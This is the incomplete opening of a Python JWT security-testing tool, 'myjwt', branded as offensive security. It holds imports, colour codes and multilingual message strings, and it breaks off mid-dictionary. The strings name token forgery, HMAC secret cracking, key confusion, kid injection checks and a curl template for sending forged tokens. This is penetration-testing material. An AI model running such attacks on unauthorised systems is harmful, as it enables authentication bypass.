#!/usr/bin/env python3
"""
myjwt - JWT Security Testing Framework
BY HACKITA - OFFENSIVE SECURITY
https://hackita.it/articoli/jwt/

Offline/online JWT decoder, auditor, attacker, and PoC generator.
"""
import argparse
import base64
import binascii
import hashlib
import hmac
import json
import os
import re
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
import ssl
import gzip
import zlib
from datetime import datetime, timezone

# --- HACKITA BRANDING COLORS ---
RED    = "\033[38;5;196m"
DRED   = "\033[38;5;88m"
WHITE  = "\033[38;5;255m"
BLACK  = "\033[38;5;236m"
GREEN  = "\033[38;5;46m"
YELLOW = "\033[38;5;226m"
DIM    = "\033[2m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

VERSION = "myjwt"
CURRENT_LANG = "en"

# --- TRANSLATIONS ---
TRANSLATIONS = {
    "en": {
        "vuln_analysis": "[*] VULNERABILITY ANALYSIS",
        "no_issues": "[+] No obvious issues found.",
        "missing_exp": "Missing 'exp' (expiration) claim",
        "missing_iss": "Missing 'iss' (issuer) claim",
        "missing_aud": "Missing 'aud' (audience) claim",
        "hmac_sym": "Symmetric HMAC ({alg}) - secret strength is crucial",
        "asym_info": "Asymmetric algorithm ({alg})",
        "missing_alg": "Missing 'alg' in header",
        "alg_none": "Algorithm 'none' is used (Unsecured token)",
        "invalid_exp": "'exp' is not a valid NumericDate",
        "token_expired": "Token is expired",
        "long_lifetime": "Token lifetime is very long ({hours} hours)",
        "future_iat": "Token issued in the future ('iat')",
        "kid_traversal": "Potential 'kid' path traversal",
        "kid_sqli": "Potential 'kid' SQL injection",
        "jku_present": "'jku' present: {url} (Check SSRF/Trust)",
        "x5u_present": "'x5u' present: {url} (Check SSRF/Trust)",
        "jwk_present": "'jwk' embedded key present",
        "x5c_present": "'x5c' embedded cert chain present",
        "sensitive_claim": "Potential sensitive claim: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "nested_payload": "[*] NESTED BASE64 PAYLOAD DETECTED (Key: '{key}')",
        "nested_type": "Type: {type}",
        "nested_class": "Class: {class_name}",
        "nested_extracted": "Extracted Strings:",
        "nested_hex": "Hex Dump:",
        "token_type": "[*] TOKEN TYPE: {type}",
        "parse_error": "[!] Parse Error: {error}",
        "jwe_encrypted": "[*] JWE Payload is encrypted.",
        "duplicate_keys": "[!] Duplicate keys detected: {keys}",
        "attack_mode": "[*] ATTACK MODE: {mode}",
        "attack_failed": "[!] Attack Failed: {error}",
        "forged_token": "[+] Forged Token:",
        "verification": "[*] VERIFICATION",
        "sig_valid": "[+] Signature VALID",
        "sig_invalid": "[!] Signature INVALID",
        "verification_error": "[!] Verification Error: {error}",
        "cracking": "[*] CRACKING HMAC SECRET",
        "secret_found": "[+] Secret found: {secret}",
        "secret_not_found": "[!] No secret found in wordlist.",
        "error": "[!] Error: {error}",
        "jwks_fetching": "[*] Fetching JWKS from {url}...",
        "jwks_found": "[+] Found {count} keys.",
        "jwks_private_key": "[!] WARNING: Private key material found (parameter 'd')!",
        "jwks_error": "[!] Error fetching JWKS: {error}",
        "http_testing": "[*] Testing HTTP Endpoint: {method} {url}",
        "http_mutated": "Mutated Status: {status} | Length: {length}",
        "http_baseline": "Baseline Status: {status} | Length: {length}",
        "http_identical": "[!] Response identical to baseline. No bypass.",
        "http_diff": "[+] Different response! Possible bypass.",
        "http_suspicious": "[?] Different response, investigate manually.",
        "http_error": "[!] HTTP Error: {error}",
        "http_success_str": "[+] Success string found in response.",
        "http_failure_str": "[!] Failure string found in response.",
        "invalid_base64": "Invalid Base64URL characters in segment",
        "invalid_length": "Invalid Base64URL length",
        "base64_error": "Base64URL decode failed: {error}",
        "invalid_json": "Invalid JSON: {error}",
        "invalid_json_nan": "Invalid JSON (NaN or Infinity found)",
        "expected_parts": "Expected 3 (JWS) or 5 (JWE) parts, got {parts}",
        "no_jwt": "No JWT found in input",
        "unsupported_hmac": "Unsupported HMAC alg: {alg}",
        "crypto_missing": "Missing 'cryptography' library. pip install cryptography",
        "requests_missing": "[!] 'requests' library required for HTTP testing. pip install requests",
        "unsupported_asym": "Unsupported asymmetric alg: {alg}",
        "cannot_forge_secret": "Cannot forge with secret for alg: {alg}",
        "jwe_crack": "JWE cannot be cracked this way",
        "not_hmac": "Not HMAC: {alg}",
        "wordlist_error": "Cannot read wordlist: {error}",
        "pubkey_required": "--pubkey required for confusion",
        "secret_required": "-k/--secret required for forge",
        "pubkey_load_error": "Failed to load public key: {error}",
        "invalid_ecdsa_len": "Invalid ECDSA signature length",
        "poc_generated": "[+] Proof of Concept (PoC) generated:",
        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
        "cve_2022_21449": "CVE-2022-21449: ECDSA signature malleability (zeroed r/s) may be accepted",
        "typ_missing": "Missing 'typ' header (token type confusion)",
        "typ_unexpected": "Unexpected 'typ' header: '{typ}' (expected JWT)",
        "crit_present": "'crit' header present: {crit} (check if critical parameters are handled)",
        "b64_false": "'b64' header is false (RFC 7797): payload is not base64url encoded",
        "jku_suspicious": "'jku' contains suspicious URL: {url}",
        "x5u_suspicious": "'x5u' contains suspicious URL: {url}",
        "kid_injection": "'kid' contains dangerous characters: {kid}",
        "risk_score": "[*] Overall Risk Score: {score} ({level})",
        "json_output": "[*] JSON output written to {file}",
        "generating": "[*] GENERATING TEST TOKEN",
        "generated_token": "[+] Generated Token ({alg}):",
        "generate_unsupported_alg": "--generate only supports alg 'none' or HMAC algs (HS256/HS384/HS512)",
        "generate_secret_required": "-k/--secret required to generate an HMAC token",
        "jwks_duplicate_kid": "[!] WARNING: duplicate 'kid' across keys: {kid} (key confusion risk)",
        "jwks_missing_kid": "[?] Key {index} has no 'kid'",
        "jwks_missing_use": "[?] Key {index} (kid={kid}) has no 'use' claim",
        "jwks_sig_enc_conflict": "[!] WARNING: key {index} (kid={kid}) declares use='{use}' but alg='{alg}' looks like the opposite",
        "crack_progress": "[*] Tried {count} words in {elapsed:.1f}s ({rate:.0f} words/sec)",
        "crack_eta": "[*] Estimated wordlist size: {total} words (~{eta:.1f}s at current rate)",
        "x5c_verifying": "[*] Verifying signature against leaf certificate in 'x5c'...",
        "x5c_valid": "[+] Signature matches the certificate embedded in 'x5c' (the header is self-consistent, still do not trust it blindly)",
        "x5c_invalid": "[!] Signature does NOT match the certificate embedded in 'x5c'",
        "x5c_error": "[!] Could not verify against 'x5c': {error}",
        "burp_exported": "[+] Raw HTTP request written to {file} (import into Burp Repeater)",
        "burp_export_error": "[!] Could not write Burp request file: {error}",
    },
    "it": {
        "vuln_analysis": "[*] ANALISI VULNERABILITÀ",
        "no_issues": "[+] Nessun problema evidente trovato.",
        "missing_exp": "Manca il claim 'exp' (scadenza)",
        "missing_iss": "Manca il claim 'iss' (emittente)",
        "missing_aud": "Manca il claim 'aud' (destinatario)",
        "hmac_sym": "HMAC Simmetrico ({alg}) - la robustezza del segreto è cruciale",
        "asym_info": "Algoritmo asimmetrico ({alg})",
        "missing_alg": "Manca 'alg' nell'header",
        "alg_none": "L'algoritmo 'none' è in uso (Token non sicuro)",
        "invalid_exp": "'exp' non è una NumericDate valida",
        "token_expired": "Il token è scaduto",
        "long_lifetime": "La durata del token è molto lunga ({hours} ore)",
        "future_iat": "Token emesso nel futuro ('iat')",
        "kid_traversal": "Potenziale path traversal in 'kid'",
        "kid_sqli": "Potenziale SQL injection in 'kid'",
        "jku_present": "'jku' presente: {url} (Controlla SSRF/Trust)",
        "x5u_present": "'x5u' presente: {url} (Controlla SSRF/Trust)",
        "jwk_present": "Chiave incorporata 'jwk' presente",
        "x5c_present": "Catena di certificati incorporata 'x5c' presente",
        "sensitive_claim": "Potenziale claim sensibile: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "nested_payload": "[*] PAYLOAD BASE64 ANNIDATO RILEVATO (Chiave: '{key}')",
        "nested_type": "Tipo: {type}",
        "nested_class": "Classe: {class_name}",
        "nested_extracted": "Stringhe Estratte:",
        "nested_hex": "Hex Dump:",
        "token_type": "[*] TIPO TOKEN: {type}",
        "parse_error": "[!] Errore di Parsing: {error}",
        "jwe_encrypted": "[*] Il payload JWE è cifrato.",
        "duplicate_keys": "[!] Chiavi duplicate rilevate: {keys}",
        "attack_mode": "[*] MODALITÀ ATTACCO: {mode}",
        "attack_failed": "[!] Attacco Fallito: {error}",
        "forged_token": "[+] Token Contraffatto:",
        "verification": "[*] VERIFICA",
        "sig_valid": "[+] Firma VALIDA",
        "sig_invalid": "[!] Firma NON VALIDA",
        "verification_error": "[!] Errore di Verifica: {error}",
        "cracking": "[*] CRACKING SEGRETO HMAC",
        "secret_found": "[+] Segreto trovato: {secret}",
        "secret_not_found": "[!] Nessun segreto trovato nella wordlist.",
        "error": "[!] Errore: {error}",
        "jwks_fetching": "[*] Recupero JWKS da {url}...",
        "jwks_found": "[+] Trovate {count} chiavi.",
        "jwks_private_key": "[!] ATTENZIONE: Materiale della chiave privata trovato (parametro 'd')!",
        "jwks_error": "[!] Errore nel recupero JWKS: {error}",
        "http_testing": "[*] Test Endpoint HTTP: {method} {url}",
        "http_mutated": "Stato Mutato: {status} | Lunghezza: {length}",
        "http_baseline": "Stato Baseline: {status} | Lunghezza: {length}",
        "http_identical": "[!] Risposta identica alla baseline. Nessun bypass.",
        "http_diff": "[+] Risposta diversa! Possibile bypass.",
        "http_suspicious": "[?] Risposta diversa, investigare manualmente.",
        "http_error": "[!] Errore HTTP: {error}",
        "http_success_str": "[+] Stringa di successo trovata nella risposta.",
        "http_failure_str": "[!] Stringa di fallimento trovata nella risposta.",
        "invalid_base64": "Caratteri Base64URL non validi nel segmento",
        "invalid_length": "Lunghezza Base64URL non valida",
        "base64_error": "Decodifica Base64URL fallita: {error}",
        "invalid_json": "JSON non valido: {error}",
        "invalid_json_nan": "JSON non valido (trovato NaN o Infinity)",
        "expected_parts": "Attese 3 (JWS) o 5 (JWE) parti, trovate {parts}",
        "no_jwt": "Nessun JWT trovato nell'input",
        "unsupported_hmac": "Algoritmo HMAC non supportato: {alg}",
        "crypto_missing": "Libreria 'cryptography' mancante. pip install cryptography",
        "requests_missing": "[!] Libreria 'requests' richiesta per il test HTTP. pip install requests",
        "unsupported_asym": "Algoritmo asimmetrico non supportato: {alg}",
        "cannot_forge_secret": "Impossibile contraffare con segreto per alg: {alg}",
        "jwe_crack": "JWE non può essere craccato in questo modo",
        "not_hmac": "Non è HMAC: {alg}",
        "wordlist_error": "Impossibile leggere la wordlist: {error}",
        "pubkey_required": "--pubkey richiesto per la confusione",
        "secret_required": "-k/--secret richiesto per la contraffazione",
        "pubkey_load_error": "Impossibile caricare la chiave pubblica: {error}",
        "invalid_ecdsa_len": "Lunghezza firma ECDSA non valida",
        "poc_generated": "[+] Proof of Concept (PoC) generato:",
        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
        "cve_2022_21449": "CVE-2022-21449: malleabilità firma ECDSA (r/s azzerati) potrebbe essere accettata",
        "typ_missing": "Manca l'header 'typ' (confusione tipo token)",
        "typ_unexpected": "Header 'typ' inatteso: '{typ}' (atteso JWT)",
        "crit_present": "Header 'crit' presente: {crit} (verifica gestione parametri critici)",
        "b64_false": "Header 'b64' è false (RFC 7797): payload non è base64url encoded",
        "jku_suspicious": "'jku' contiene URL sospetto: {url}",
        "x5u_suspicious": "'x5u' contiene URL sospetto: {url}",
        "kid_injection": "'kid' contiene caratteri pericolosi: {kid}",
        "risk_score": "[*] Punteggio di Rischio Complessivo: {score} ({level})",
        "json_output": "[*] Output JSON scritto in {file}",
        "generating": "[*] GENERAZIONE TOKEN DI TEST",
        "generated_token": "[+] Token generato ({alg}):",
        "generate_unsupported_alg": "--generate supporta solo alg 'none' o HMAC (HS256/HS384/HS512)",
        "generate_secret_required": "-k/--secret richiesto per generare un token HMAC",
        "jwks_duplicate_kid": "[!] ATTENZIONE: 'kid' duplicato tra le chiavi: {kid} (rischio key confusion)",
        "jwks_missing_kid": "[?] La chiave {index} non ha 'kid'",
        "jwks_missing_use": "[?] La chiave {index} (kid={kid}) non ha il campo 'use'",
        "jwks_sig_enc_conflict": "[!] ATTENZIONE: la chiave {index} (kid={kid}) dichiara use='{use}' ma alg='{alg}' sembra l'opposto",
        "crack_progress": "[*] Provate {count} parole in {elapsed:.1f}s ({rate:.0f} parole/sec)",
        "crack_eta": "[*] Dimensione stimata wordlist: {total} parole (~{eta:.1f}s al ritmo attuale)",
        "x5c_verifying": "[*] Verifica della firma contro il certificato leaf in 'x5c'...",
        "x5c_valid": "[+] La firma corrisponde al certificato incorporato in 'x5c' (l'header è coerente, non fidarti comunque ciecamente)",
        "x5c_invalid": "[!] La firma NON corrisponde al certificato incorporato in 'x5c'",
        "x5c_error": "[!] Impossibile verificare con 'x5c': {error}",
        "burp_exported": "[+] Richiesta HTTP raw scritta in {file} (importala in Burp Repeater)",
        "burp_export_error": "[!] Impossibile scrivere il file della richiesta Burp: {error}",
    },
    "es": {
        "vuln_analysis": "[*] ANÁLISIS DE VULNERABILIDADES",
        "no_issues": "[+] No se encontraron problemas obvios.",
        "missing_exp": "Falta el claim 'exp' (expiración)",
        "missing_iss": "Falta el claim 'iss' (emisor)",
        "missing_aud": "Falta el claim 'aud' (audiencia)",
        "hmac_sym": "HMAC Simétrico ({alg}) - la fuerza del secreto es crucial",
        "asym_info": "Algoritmo asimétrico ({alg})",
        "missing_alg": "Falta 'alg' en el header",
        "alg_none": "Se usa el algoritmo 'none' (Token inseguro)",
        "invalid_exp": "'exp' no es una NumericDate válida",
        "token_expired": "El token ha expirado",
        "long_lifetime": "La vida útil del token es muy larga ({hours} horas)",
        "future_iat": "Token emitido en el futuro ('iat')",
        "kid_traversal": "Posible path traversal en 'kid'",
        "kid_sqli": "Posible inyección SQL en 'kid'",
        "jku_present": "'jku' presente: {url} (Verificar SSRF/Confianza)",
        "x5u_present": "'x5u' presente: {url} (Verificar SSRF/Confianza)",
        "jwk_present": "Clave incrustada 'jwk' presente",
        "x5c_present": "Cadena de certificados incrustada 'x5c' presente",
        "sensitive_claim": "Posible claim sensible: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "nested_payload": "[*] PAYLOAD BASE64 ANIDADO DETECTADO (Clave: '{key}')",
        "nested_type": "Tipo: {type}",
        "nested_class": "Clase: {class_name}",
        "nested_extracted": "Cadenas Extraídas:",
        "nested_hex": "Hex Dump:",
        "token_type": "[*] TIPO DE TOKEN: {type}",
        "parse_error": "[!] Error de Parseo: {error}",
        "jwe_encrypted": "[*] El payload JWE está cifrado.",
        "duplicate_keys": "[!] Claves duplicadas detectadas: {keys}",
        "attack_mode": "[*] MODO ATAQUE: {mode}",
        "attack_failed": "[!] Ataque Fallido: {error}",
        "forged_token": "[+] Token Falsificado:",
        "verification": "[*] VERIFICACIÓN",
        "sig_valid": "[+] Firma VÁLIDA",
        "sig_invalid": "[!] Firma INVÁLIDA",
        "verification_error": "[!] Error de Verificación: {error}",
        "cracking": "[*] CRACKEANDO SECRETO HMAC",
        "secret_found": "[+] Secreto encontrado: {secret}",
        "secret_not_found": "[!] No se encontró ningún secreto en la wordlist.",
        "error": "[!] Error: {error}",
        "jwks_fetching": "[*] Obteniendo JWKS de {url}...",
        "jwks_found": "[+] Encontradas {count} claves.",
        "jwks_private_key": "[!] ADVERTENCIA: ¡Material de clave privada encontrado (parámetro 'd')!",
        "jwks_error": "[!] Error al obtener JWKS: {error}",
        "http_testing": "[*] Probando Endpoint HTTP: {method} {url}",
        "http_mutated": "Estado Mutado: {status} | Longitud: {length}",
        "http_baseline": "Estado Baseline: {status} | Longitud: {length}",
        "http_identical": "[!] Respuesta idéntica a la baseline. Sin bypass.",
        "http_diff": "[+] ¡Respuesta diferente! Posible bypass.",
        "http_suspicious": "[?] Respuesta diferente, investigar manualmente.",
        "http_error": "[!] Error HTTP: {error}",
        "http_success_str": "[+] Cadena de éxito encontrada en la respuesta.",
        "http_failure_str": "[!] Cadena de fallo encontrada en la respuesta.",
        "invalid_base64": "Caracteres Base64URL inválidos en el segmento",
        "invalid_length": "Longitud Base64URL inválida",
        "base64_error": "Fallo en decodificación Base64URL: {error}",
        "invalid_json": "JSON inválido: {error}",
        "invalid_json_nan": "JSON inválido (se encontró NaN o Infinity)",
        "expected_parts": "Se esperaban 3 (JWS) o 5 (JWE) partes, se encontraron {parts}",
        "no_jwt": "No se encontró ningún JWT en la entrada",
        "unsupported_hmac": "Algoritmo HMAC no soportado: {alg}",
        "crypto_missing": "Falta la librería 'cryptography'. pip install cryptography",
        "requests_missing": "[!] Se requiere la librería 'requests' para pruebas HTTP. pip install requests",
        "unsupported_asym": "Algoritmo asimétrico no soportado: {alg}",
        "cannot_forge_secret": "No se puede falsificar con secreto para alg: {alg}",
        "jwe_crack": "JWE no se puede crackear de esta manera",
        "not_hmac": "No es HMAC: {alg}",
        "wordlist_error": "No se puede leer la wordlist: {error}",
        "pubkey_required": "Se requiere --pubkey para la confusión",
        "secret_required": "Se requiere -k/--secret para falsificar",
        "pubkey_load_error": "Fallo al cargar la clave pública: {error}",
        "invalid_ecdsa_len": "Longitud de firma ECDSA inválida",
        "poc_generated": "[+] Prueba de Concepto (PoC) generada:",
        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
        "cve_2022_21449": "CVE-2022-21449: maleabilidad de firma ECDSA (r/s a cero) podría ser aceptada",
        "typ_missing": "Falta el header 'typ' (confusión de tipo de token)",
        "typ_unexpected": "Header 'typ' inesperado: '{typ}' (esperado JWT)",
        "crit_present": "Header 'crit' presente: {crit} (verificar manejo de parámetros críticos)",
        "b64_false": "Header 'b64' es false (RFC 7797): payload no está codificado en base64url",
        "jku_suspicious": "'jku' contiene URL sospechosa: {url}",
        "x5u_suspicious": "'x5u' contiene URL sospechosa: {url}",
        "kid_injection": "'kid' contiene caracteres peligrosos: {kid}",
        "risk_score": "[*] Puntuación de Riesgo Global: {score} ({level})",
        "json_output": "[*] Salida JSON escrita en {file}",
    },
    "pt": {
        "vuln_analysis": "[*] ANÁLISE DE VULNERABILIDADES",
        "no_issues": "[+] Nenhum problema óbvio encontrado.",
        "missing_exp": "Falta o claim 'exp' (expiração)",
        "missing_iss": "Falta o claim 'iss' (emissor)",
        "missing_aud": "Falta o claim 'aud' (audiência)",
        "hmac_sym": "HMAC Simétrico ({alg}) - a força do segredo é crucial",
        "asym_info": "Algoritmo assimétrico ({alg})",
        "missing_alg": "Falta 'alg' no header",
        "alg_none": "O algoritmo 'none' está em uso (Token inseguro)",
        "invalid_exp": "'exp' não é uma NumericDate válida",
        "token_expired": "O token expirou",
        "long_lifetime": "O tempo de vida do token é muito longo ({hours} horas)",
        "future_iat": "Token emitido no futuro ('iat')",
        "kid_traversal": "Potencial path traversal em 'kid'",
        "kid_sqli": "Potencial injeção SQL em 'kid'",
        "jku_present": "'jku' presente: {url} (Verificar SSRF/Confiança)",
        "x5u_present": "'x5u' presente: {url} (Verificar SSRF/Confiança)",
        "jwk_present": "Chave incorporada 'jwk' presente",
        "x5c_present": "Cadeia de certificados incorporada 'x5c' presente",
        "sensitive_claim": "Potencial claim sensível: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "nested_payload": "[*] PAYLOAD BASE64 ANINHADO DETECTADO (Chave: '{key}')",
        "nested_type": "Tipo: {type}",
        "nested_class": "Classe: {class_name}",
        "nested_extracted": "Strings Extraídas:",
        "nested_hex": "Hex Dump:",
        "token_type": "[*] TIPO DE TOKEN: {type}",
        "parse_error": "[!] Erro de Parsing: {error}",
        "jwe_encrypted": "[*] O payload JWE está criptografado.",
        "duplicate_keys": "[!] Chaves duplicadas detectadas: {keys}",
        "attack_mode": "[*] MODO ATAQUE: {mode}",
        "attack_failed": "[!] Ataque Falhou: {error}",
        "forged_token": "[+] Token Falsificado:",
        "verification": "[*] VERIFICAÇÃO",
        "sig_valid": "[+] Assinatura VÁLIDA",
        "sig_invalid": "[!] Assinatura INVÁLIDA",
        "verification_error": "[!] Erro de Verificação: {error}",
        "cracking": "[*] CRACKEANDO SEGREDO HMAC",
        "secret_found": "[+] Segredo encontrado: {secret}",
        "secret_not_found": "[!] Nenhum segredo encontrado na wordlist.",
        "error": "[!] Erro: {error}",
        "jwks_fetching": "[*] Obtendo JWKS de {url}...",
        "jwks_found": "[+] Encontradas {count} chaves.",
        "jwks_private_key": "[!] AVISO: Material de chave privada encontrado (parâmetro 'd')!",
        "jwks_error": "[!] Erro ao obter JWKS: {error}",
        "http_testing": "[*] Testando Endpoint HTTP: {method} {url}",
        "http_mutated": "Status Mutado: {status} | Comprimento: {length}",
        "http_baseline": "Status Baseline: {status} | Comprimento: {length}",
        "http_identical": "[!] Resposta idêntica à baseline. Sem bypass.",
        "http_diff": "[+] Resposta diferente! Possível bypass.",
        "http_suspicious": "[?] Resposta diferente, investigar manualmente.",
        "http_error": "[!] Erro HTTP: {error}",
        "http_success_str": "[+] String de sucesso encontrada na resposta.",
        "http_failure_str": "[!] String de falha encontrada na resposta.",
        "invalid_base64": "Caracteres Base64URL inválidos no segmento",
        "invalid_length": "Comprimento Base64URL inválido",
        "base64_error": "Falha na decodificação Base64URL: {error}",
        "invalid_json": "JSON inválido: {error}",
        "invalid_json_nan": "JSON inválido (NaN ou Infinity encontrados)",
        "expected_parts": "Esperadas 3 (JWS) ou 5 (JWE) partes, encontradas {parts}",
        "no_jwt": "Nenhum JWT encontrado na entrada",
        "unsupported_hmac": "Algoritmo HMAC não suportado: {alg}",
        "crypto_missing": "Biblioteca 'cryptography' ausente. pip install cryptography",
        "requests_missing": "[!] Biblioteca 'requests' necessária para testes HTTP. pip install requests",
        "unsupported_asym": "Algoritmo assimétrico não suportado: {alg}",
        "cannot_forge_secret": "Não é possível falsificar com segredo para alg: {alg}",
        "jwe_crack": "JWE não pode ser crackeado desta forma",
        "not_hmac": "Não é HMAC: {alg}",
        "wordlist_error": "Não é possível ler a wordlist: {error}",
        "pubkey_required": "--pubkey necessário para confusão",
        "secret_required": "-k/--secret necessário para falsificação",
        "pubkey_load_error": "Falha ao carregar chave pública: {error}",
        "invalid_ecdsa_len": "Comprimento de assinatura ECDSA inválido",
        "poc_generated": "[+] Prova de Conceito (PoC) gerada:",
        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
        "cve_2022_21449": "CVE-2022-21449: maleabilidade de assinatura ECDSA (r/s zerados) pode ser aceita",
        "typ_missing": "Falta o header 'typ' (confusão de tipo de token)",
        "typ_unexpected": "Header 'typ' inesperado: '{typ}' (esperado JWT)",
        "crit_present": "Header 'crit' presente: {crit} (verificar manipulação de parâmetros críticos)",
        "b64_false": "Header 'b64' é false (RFC 7797): payload não está codificado em base64url",
        "jku_suspicious": "'jku' contém URL suspeita: {url}",
        "x5u_suspicious": "'x5u' contém URL suspeita: {url}",
        "kid_injection": "'kid' contém caracteres perigosos: {kid}",
        "risk_score": "[*] Pontuação de Risco Geral: {score} ({level})",
        "json_output": "[*] Saída JSON escrita em {file}",
    },
    "de": {
        "vuln_analysis": "[*] SCHWACHSTELLENANALYSE",
        "no_issues": "[+] Keine offensichtlichen Probleme gefunden.",
        "missing_exp": "'exp' (Ablauf) Claim fehlt",
        "missing_iss": "'iss' (Aussteller) Claim fehlt",
        "missing_aud": "'aud' (Zielgruppe) Claim fehlt",
        "hmac_sym": "Symmetrisches HMAC ({alg}) - die Stärke des Geheimnisses ist entscheidend",
        "asym_info": "Asymmetrischer Algorithmus ({alg})",
        "missing_alg": "'alg' im Header fehlt",
        "alg_none": "Algorithmus 'none' wird verwendet (Unsicheres Token)",
        "invalid_exp": "'exp' ist kein gültiges NumericDate",
        "token_expired": "Token ist abgelaufen",
        "long_lifetime": "Token-Lebensdauer ist sehr lang ({hours} Stunden)",
        "future_iat": "Token in der Zukunft ausgestellt ('iat')",
        "kid_traversal": "Möglicher 'kid' Path Traversal",
        "kid_sqli": "Mögliche 'kid' SQL-Injection",
        "jku_present": "'jku' vorhanden: {url} (SSRF/Vertrauen prüfen)",
        "x5u_present": "'x5u' vorhanden: {url} (SSRF/Vertrauen prüfen)",
        "jwk_present": "Eingebetteter Schlüssel 'jwk' vorhanden",
        "x5c_present": "Eingebettete Zertifikatskette 'x5c' vorhanden",
        "sensitive_claim": "Möglicher sensibler Claim: '{key}'",
        "header": "[*] HEADER",
        "payload": "[*] PAYLOAD",
        "nested_payload": "[*] VERSCHACHTELTER BASE64-PAYLOAD ERKANNT (Schlüssel: '{key}')",
        "nested_type": "Typ: {type}",
        "nested_class": "Klasse: {class_name}",
        "nested_extracted": "Extrahierte Strings:",
        "nested_hex": "Hex Dump:",
        "token_type": "[*] TOKEN-TYP: {type}",
        "parse_error": "[!] Parsing-Fehler: {error}",
        "jwe_encrypted": "[*] JWE Payload ist verschlüsselt.",
        "duplicate_keys": "[!] Doppelte Schlüssel erkannt: {keys}",
        "attack_mode": "[*] ANGRIFFSMODUS: {mode}",
        "attack_failed": "[!] Angriff fehlgeschlagen: {error}",
        "forged_token": "[+] Gefälschtes Token:",
        "verification": "[*] VERIFIZIERUNG",
        "sig_valid": "[+] Signatur GÜLTIG",
        "sig_invalid": "[!] Signatur UNGÜLTIG",
        "verification_error": "[!] Verifizierungsfehler: {error}",
        "cracking": "[*] HMAC GEHEIMNIS CRACKEN",
        "secret_found": "[+] Geheimnis gefunden: {secret}",
        "secret_not_found": "[!] Kein Geheimnis in der Wordlist gefunden.",
        "error": "[!] Fehler: {error}",
        "jwks_fetching": "[*] Abrufen von JWKS von {url}...",
        "jwks_found": "[+] {count} Schlüssel gefunden.",
        "jwks_private_key": "[!] WARNUNG: Privates Schlüsselmaterial gefunden (Parameter 'd')!",
        "jwks_error": "[!] Fehler beim Abrufen von JWKS: {error}",
        "http_testing": "[*] Teste HTTP-Endpunkt: {method} {url}",
        "http_mutated": "Mutierter Status: {status} | Länge: {length}",
        "http_baseline": "Baseline-Status: {status} | Länge: {length}",
        "http_identical": "[!] Antwort identisch mit Baseline. Kein Bypass.",
        "http_diff": "[+] Unterschiedliche Antwort! Möglicher Bypass.",
        "http_suspicious": "[?] Unterschiedliche Antwort, manuell untersuchen.",
        "http_error": "[!] HTTP-Fehler: {error}",
        "http_success_str": "[+] Erfolgs-String in der Antwort gefunden.",
        "http_failure_str": "[!] Fehler-String in der Antwort gefunden.",
        "invalid_base64": "Ungültige Base64URL-Zeichen im Segment",
        "invalid_length": "Ungültige Base64URL-Länge",
        "base64_error": "Base64URL-Dekodierung fehlgeschlagen: {error}",
        "invalid_json": "Ungültiges JSON: {error}",
        "invalid_json_nan": "Ungültiges JSON (NaN oder Infinity gefunden)",
        "expected_parts": "3 (JWS) oder 5 (JWE) Teile erwartet, {parts} gefunden",
        "no_jwt": "Kein JWT in der Eingabe gefunden",
        "unsupported_hmac": "Nicht unterstützter HMAC-Algorithmus: {alg}",
        "crypto_missing": "Bibliothek 'cryptography' fehlt. pip install cryptography",
        "requests_missing": "[!] Bibliothek 'requests' für HTTP-Tests erforderlich. pip install requests",
        "unsupported_asym": "Nicht unterstützter asymmetrischer Algorithmus: {alg}",
        "cannot_forge_secret": "Kann nicht mit Geheimnis für alg fälschen: {alg}",
        "jwe_crack": "JWE kann nicht auf diese Weise geknackt werden",
        "not_hmac": "Kein HMAC: {alg}",
        "wordlist_error": "Wordlist kann nicht gelesen werden: {error}",
        "pubkey_required": "--pubkey für Konfusion erforderlich",
        "secret_required": "-k/--secret zum Fälschen erforderlich",
        "pubkey_load_error": "Öffentlicher Schlüssel konnte nicht geladen werden: {error}",
        "invalid_ecdsa_len": "Ungültige ECDSA-Signaturlänge",
        "poc_generated": "[+] Proof of Concept (PoC) generiert:",
        "poc_curl": "  curl -X {method} '{url}' -H 'Authorization: Bearer {token}'",
        "cve_2022_21449": "CVE-2022-21449: ECDSA-Signatur-Malleabilität (r/s genullt) könnte akzeptiert werden",
        "typ_missing": "'typ' Header fehlt (Token-Typ-Verwechslung)",
        "typ_unexpected": "Unerwarteter 'typ' Header: '{typ}' (JWT erwartet)",
        "crit_present": "'crit' Header vorhanden: {crit} (Prüfen, ob kritische Parameter verarbeitet werden)",
        "b64_false": "'b64' Header ist false (RFC 7797): Payload ist nicht base64url-kodiert",
        "jku_suspicious": "'jku' enthält verdächtige URL: {url}",
        "x5u_suspicious": "'x5u' enthält verdächtige URL: {url}",
        "kid_injection": "'kid' enthält gefährliche Zeichen: {kid}",
        "risk_score": "[*] Gesamtrisikobewertung: {score} ({level})",
        "json_output": "[*] JSON-Ausgabe geschrieben nach {file}",
    },
    "fr": {
        "vuln_analysis": "[*] ANALYSE DES VULNÉRABILITÉS",
        "no_issues": "[+] Aucun problème évident trouvé.",
        "missing_exp": "Claim 'exp' (expiration) manquant",
        "missing_iss": "Claim 'iss' (émetteur) manquant",
        "missing_aud": "Claim 'aud' (audience) manquant",
        "hmac_sym": "HMAC Symétrique ({alg}) - la force du secret est cruciale",
        "asym_info": "Algorithme asymétrique ({alg})",
        "missing_alg": "'alg' manquant dans l'en-tête",
        "alg_none": "L'algorithme 'none' est utilisé (Token non sécurisé)",
        "invalid_exp": "'exp' n'est pas une NumericDate valide",
        "token_expired": "Le token est expiré",
        "long_lifetime": "La durée de vie du token est très longue ({hours} heures)",
        "future_iat": "Token émis dans le futur ('iat')",
        "kid_traversal": "Path traversal potentiel dans 'kid'",
        "kid_sqli": "Injection SQL potentielle dans 'kid'",
        "jku_present": "'jku' présent : {url} (Vérifier SSRF/Confiance)",
        "x5u_present": "'x5u' présent : {url} (Vérifier SSRF/Confiance)",
        "jwk_present": "Clé intégrée 'jwk' présente",
        "x5c_present": "Chaîne de certificats intégrée 'x5c' présente",
